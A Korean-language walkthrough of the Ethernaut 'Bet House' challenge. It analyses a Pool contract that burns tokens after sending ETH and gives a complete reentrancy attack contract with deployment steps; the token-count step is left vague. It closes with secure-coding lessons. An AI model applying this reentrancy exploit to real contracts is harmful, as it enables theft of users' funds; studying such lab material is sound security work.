# Ethernaut Level 34 - Bet House

## 문제 설명

5개의 PDT(Pool Deposit Token)를 가지고 시작한다.
베터(bettor)가 되기 위한 조건을 우회하여 등록하는 것이 목표이다.

---

## 컨트랙트 분석

```solidity
contract BetHouse {
    uint256 private constant BET_PRICE = 20;

    function makeBet(address bettor_) external {
        if (Pool(pool).balanceOf(msg.sender) < BET_PRICE) {
            revert InsufficientFunds();
        }
        if (!Pool(pool).depositsLocked(msg.sender)) revert FundsNotLocked();
        bettors[bettor_] = true;
    }
}

contract Pool is ReentrancyGuard {
    function deposit(uint256 value_) external payable {
        if (depositsLockedMap[msg.sender]) revert DepositsAreLocked();

        uint256 _valueToMint;
        // ETH 0.001 예치 → wrappedToken 10개 발행
        if (msg.value == 0.001 ether) {
            if (alreadyDeposited) revert AlreadyDeposited();  // ← 전역 플래그!
            depositedEther[msg.sender] += msg.value;
            alreadyDeposited = true;
            _valueToMint += 10;
        }
        // PDT 예치 → wrappedToken 1:1 발행
        if (value_ > 0) {
            // ...
            _valueToMint += value_;
        }
        PoolToken(wrappedToken).mint(msg.sender, _valueToMint);
    }

    function withdrawAll() external nonReentrant {
        uint256 _depositedValue = depositedPDT[msg.sender];
        if (_depositedValue > 0) {
            depositedPDT[msg.sender] = 0;
            PoolToken(depositToken).transfer(msg.sender, _depositedValue);
        }

        _depositedValue = depositedEther[msg.sender];
        if (_depositedValue > 0) {
            depositedEther[msg.sender] = 0;
            payable(msg.sender).call{value: _depositedValue}("");  // ← ETH 전송 후 burn
        }

        PoolToken(wrappedToken).burn(msg.sender, balanceOf(msg.sender));
    }
}
```

---

## 취약점 분석

### 베터 조건

```
1. Pool.balanceOf(msg.sender) >= 20  (wrappedToken 20개 이상)
2. Pool.depositsLocked(msg.sender) == true
```

플레이어는 PDT 5개만 보유 → 예치해도 wrappedToken 5개 → 조건 1 불충족

### 1. alreadyDeposited는 전역 플래그

`alreadyDeposited`는 **개인별이 아닌 컨트랙트 전역 플래그**이다.

한 주소가 ETH를 예치하면 이후 다른 모든 주소도 ETH 예치 불가.
그러나 이 플래그는 **ETH 예치 금지만** 할 뿐, 다른 공격 경로를 막지는 않는다.

### 2. fallback을 이용한 재진입

`withdrawAll`의 실행 순서:
```
1. PDT 반환
2. ETH 반환 → payable(msg.sender).call{value}("")  ← 여기서 fallback 실행!
3. wrappedToken burn
```

ETH 전송 시 공격 컨트랙트의 `receive()`가 실행되는 시점에는
아직 `wrappedToken.burn()`이 실행되지 않았다!

→ `receive()` 내에서 다시 `lockDeposits()` + `makeBet()` 호출 가능

### 3. 공격 흐름

```
1. 공격 컨트랙트가 PDT 5개를 Pool에 예치
   → wrappedToken 5개 획득 (부족)

2. ETH 0.001을 Pool에 예치
   → wrappedToken 10개 추가 = 총 15개 (여전히 부족)

3. 다른 계정(헬퍼)도 ETH/PDT 예치해 공격 컨트랙트에 wrappedToken 전송
   → 총 20개 이상 확보

4. lockDeposits() 호출

5. withdrawAll() 호출
   → ETH 반환 시 receive() 실행
   → receive() 내에서 makeBet(player) 호출
   → 이 시점엔 아직 burn 안됨 → balanceOf >= 20 조건 통과!
```

---

## 공격 컨트랙트

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPool {
    function deposit(uint256 value_) external payable;
    function withdrawAll() external;
    function lockDeposits() external;
    function balanceOf(address) external view returns (uint256);
}

interface IBetHouse {
    function makeBet(address bettor_) external;
    function isBettor(address) external view returns (bool);
}

interface IERC20 {
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract BetHouseAttack {
    IPool public pool;
    IBetHouse public betHouse;
    IERC20 public pdt;
    address public player;
    bool public attacked;

    constructor(address _pool, address _betHouse, address _pdt, address _player) {
        pool = IPool(_pool);
        betHouse = IBetHouse(_betHouse);
        pdt = IERC20(_pdt);
        player = _player;
    }

    function attack(uint256 pdtAmount) external payable {
        // PDT approve 후 예치
        pdt.approve(address(pool), pdtAmount);
        pool.deposit{value: msg.value}(pdtAmount);

        // 잠금 후 출금 (재진입 트리거)
        pool.lockDeposits();
        pool.withdrawAll();
    }

    receive() external payable {
        if (!attacked) {
            attacked = true;
            // burn 전에 makeBet 호출
            betHouse.makeBet(player);
        }
    }
}
```

---

## 공격 단계

### Step 1 — 주소 확인

```js
let poolAddr = await contract.pool()
let pdtAddr  = await contract.depositToken()  // Pool에서 확인
```

### Step 2 — wrappedToken 20개 확보

플레이어 PDT 5개 + ETH 예치로 wrappedToken 15개,
추가로 다른 경로로 5개 확보하거나 공격 컨트랙트에 직접 전송

### Step 3 — 공격 컨트랙트 배포 및 실행

```
_pool    : Pool 주소
_betHouse: BetHouse 주소
_pdt     : PDT 토큰 주소
_player  : 내 지갑 주소
```

```js
await attackContract.attack(5, { value: toWei("0.001") })
```

### Step 4 — 확인

```js
await betHouse.isBettor(player)
// → true
```

---

## 핵심 교훈

- `alreadyDeposited` 같은 전역 플래그는 개인별 플래그로 대체해야 함
- ETH 전송 후 상태 변경(burn)이 발생하면 재진입 가능
- Checks-Effects-Interactions 패턴: **burn을 ETH 전송보다 먼저** 실행해야 함
- `nonReentrant`가 있어도 외부 호출(BetHouse)은 별도 컨트랙트라 가드 미적용

```solidity
// ✅ 안전한 순서
PoolToken(wrappedToken).burn(msg.sender, balanceOf(msg.sender));  // 먼저 burn
payable(msg.sender).call{value: _depositedValue}("");              // 그 다음 전송
```
